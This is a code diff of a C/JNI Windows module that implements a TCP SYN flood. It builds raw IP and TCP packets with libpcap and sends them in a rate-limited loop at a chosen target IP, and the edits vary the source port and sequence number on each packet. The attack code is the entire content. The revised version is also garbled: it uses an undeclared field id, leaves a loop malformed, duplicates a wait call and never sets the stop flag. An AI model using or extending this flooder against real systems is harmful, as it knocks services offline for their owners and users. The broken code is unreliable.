@@ -107,14 +107,12 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
     pcap_t *handle;
     char errbuf[PCAP_ERRBUF_SIZE];
     
-    // Open the default network adapter for packet injection
     handle = pcap_open_live(NULL, 65536, 1, 1000, errbuf);
     if (handle == NULL) {
         fprintf(stderr, "Couldn't open device: %s\n", errbuf);
         return 1;
     }
 
-    // Prepare your packet here (IP header + TCP header)
     char packet[PACKET_SIZE];
     struct iphdr *ip = (struct iphdr *)packet;
     struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
@@ -128,7 +126,6 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
     ip->frag_off = 0;
     ip->ttl = 255;
     ip->protocol = IPPROTO_TCP;
-    ip->check = 0; // We'll calculate the checksum later
     ip->saddr = inet_addr("192.168.1.100"); // Replace with your source IP
     ip->daddr = inet_addr(data->target_ip);
 
@@ -145,14 +142,23 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
     tcp->ack = 0;
     tcp->urg = 0;
     tcp->window = htons(5840);
-    tcp->check = 0; // We'll calculate the checksum later
-    tcp->urg_ptr = 0;
 
-    DWORD start_time = GetTickCount();
-    int bytes_sent = 0;
-    int packets_sent = 0;
+    LARGE_INTEGER frequency, start_time, current_time;
+    QueryPerformanceFrequency(&frequency);
+    QueryPerformanceCounter(&start_time);
+
+    double packets_per_second = (double)data->bytes_per_second / PACKET_SIZE;
+    double interval = 1.0 / packets_per_second;
+
+    uint32_t seq_num = 1000;
+    uint16_t src_port = 12345;
 
     while (!*(data->stop_attack)) {
+        // Update IP and TCP headers for each packet
+        ip->id = htons(rand());
+        tcp->source = htons(src_port++);
+        tcp->seq = htonl(seq_num++);
+
         // Calculate IP checksum
         ip->check = 0;
         ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));
@@ -164,31 +170,26 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
         // Send the packet
         if (pcap_sendpacket(handle, (u_char*)packet, PACKET_SIZE) != 0) {
             fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
-        } else {
-            packets_sent++;
-            bytes_sent += PACKET_SIZE;
         }
 
         // Rate limiting
-        if (bytes_sent >= data->bytes_per_second) {
-            DWORD elapsed_time = GetTickCount() - start_time;
-            if (elapsed_time < 1000) {
-                Sleep(1000 - elapsed_time);
+        QueryPerformanceCounter(&current_time);
+        double elapsed = (double)(current_time.QuadPart - start_time.QuadPart) / frequency.QuadPart;
+        if (elapsed < interval) {
+            DWORD sleep_time = (DWORD)((interval - elapsed) * 1000);
+            if (sleep_time > 0) {
+                Sleep(sleep_time);
             }
-            printf("Sent %d packets, %d bytes\n", packets_sent, bytes_sent);
-            start_time = GetTickCount();
-            bytes_sent = 0;
-            packets_sent = 0;
         }
+        start_time = current_time;
     }
 
     pcap_close(handle);
     return 0;
 }
 
-JNIEXPORT jboolean JNICALL Java_com_yourpackage_Jenkins_tcpSynFlood
-  (JNIEnv *env, jobject obj, jstring targetIp, jint targetPort, jint bytesPerSecond) {
-    printf("tcpSynFlood method called\n");
+JNIEXPORT jboolean JNICALL Java_com_yourpackage_Jenkins_nativeTcpSynFlood
+  (JNIEnv *env, jobject obj, jstring targetIp, jint targetPort, jlong bytesPerSecond) {
     const char *ip = env->GetStringUTFChars(targetIp, 0);
     struct thread_data data;
     data.target_ip = ip;
@@ -196,32 +197,17 @@ JNIEXPORT jboolean JNICALL Java_com_yourpackage_Jenkins_tcpSynFlood
     data.bytes_per_second = bytesPerSecond;
     volatile bool stop_attack = false;
     data.stop_attack = &stop_attack;
-
-    HANDLE thread;
-    thread = CreateThread(NULL, 0, send_syn_packets, (LPVOID)&data, 0, NULL);
-
+    jclass cls = env->GetObjectClass(obj);
+    HANDLE thread = CreateThread(NULL, 0, send_syn_packets, (LPVOID)&data, 0, NULL);
+    while (!env->GetBooleanField(obj, fid)) {
     if (thread == NULL) {
-        printf("Failed to create thread. Error: %d\n", GetLastError());
         env->ReleaseStringUTFChars(targetIp, ip);
         return JNI_FALSE;
     }
-
-    printf("Thread created successfully\n");
-
-    // Wait for Java to call stopAttack()
-    jclass cls = env->GetObjectClass(obj);
-    jfieldID fid = env->GetFieldID(cls, "stopAttack", "Z");
-    while (!env->GetBooleanField(obj, fid)) {
-        Sleep(100); // Sleep for 100ms
-    }
-
-    stop_attack = true;
-    printf("Stop attack flag set to true\n");
+    WaitForSingleObject(thread, INFINITE);
+    // Wait for the thread to finish
     WaitForSingleObject(thread, INFINITE);
     CloseHandle(thread);
-    printf("Thread closed\n");
-
     env->ReleaseStringUTFChars(targetIp, ip);
-    printf("tcpSynFlood method completed\n");
     return JNI_TRUE;
 }
